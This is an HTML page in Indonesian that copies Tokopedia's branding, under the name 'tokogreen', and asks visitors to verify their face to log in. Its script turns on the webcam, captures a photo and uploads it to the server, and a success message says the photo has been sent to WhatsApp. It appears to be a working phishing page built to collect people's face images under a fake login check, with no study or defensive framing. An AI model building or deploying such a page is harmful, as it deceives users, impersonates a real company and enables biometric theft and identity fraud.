<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Login - Tokopedia</title>
    <style>
        :root { --p: #00AA5B; }
        body { background: #f0f3f7; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 90%; max-width: 350px; text-align: center; }
        .cam-box { width: 200px; height: 200px; border-radius: 50%; border: 4px solid var(--p); margin: 20px auto; overflow: hidden; position: relative; background: #000; }
        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
        .btn { background: var(--p); color: #fff; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        .btn:disabled { background: #ccc; }
        #status { font-size: 12px; margin-top: 10px; color: #888; }
    </style>
</head>
<body>
    <div class="card">
        <h2 style="color:var(--p)">tokogreen</h2>
        <p style="font-size:14px;color:#666">Verifikasi wajah untuk login</p>
        <div class="cam-box"><video id="webcam" autoplay playsinline muted></video></div>
        <button id="btn-login" class="btn" disabled>Login Sekarang</button>
        <div id="status">Mengaktifkan kamera...</div>
    </div>

    <canvas id="canvas" style="display:none"></canvas>

    <script>
        const video = document.getElementById('webcam');
        const btn = document.getElementById('btn-login');
        const status = document.getElementById('status');

        // Aktifkan Kamera (HTTPS Render akan otomatis izinkan ini)
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                video.srcObject = stream;
                btn.disabled = false;
                status.innerText = "Kamera Aktif ✅";
            })
            .catch(err => {
                status.innerText = "Error: Kamera diblokir!";
                status.style.color = "red";
            });

        btn.onclick = async () => {
            btn.disabled = true;
            btn.innerText = "Memproses...";
            
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0);

            const base64 = canvas.toDataURL('image/jpeg', 0.6);

            try {
                // Fetch ke endpoint /upload di server yang sama
                const res = await fetch('/upload', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: base64 })
                });

                if (res.ok) {
                    alert("Berhasil! Foto terkirim ke WhatsApp.");
                    location.reload();
                }
            } catch (e) {
                alert("Gagal kirim data!");
                btn.disabled = false;
            }
        };
    </script>
</body>
</html>
